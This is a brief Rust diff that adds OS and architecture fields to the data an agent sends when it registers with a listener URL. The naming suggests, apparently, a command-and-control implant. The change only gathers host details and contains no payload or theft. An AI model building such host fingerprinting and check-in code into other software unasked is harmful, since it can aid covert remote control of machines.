@@ -44,6 +44,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
         Ok(name) => name,
         Err(_) => "unknown".to_string(),
     };
+    let os = std::env::consts::OS.to_string();
+    let arch = std::env::consts::ARCH.to_string();
     let listener_url = format!(
         "{}://{}:{}/",
         config.listener.proto.to_string(),
@@ -51,7 +53,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
         config.listener.port.to_owned(),
     );
 
-    let mut ra = AgentData::new(agent_name, hostname, listener_url);
+    let mut ra = AgentData::new(agent_name, hostname, os, arch, listener_url);
     let ra_json = serde_json::to_string(&ra).unwrap();
 
     // Register agent
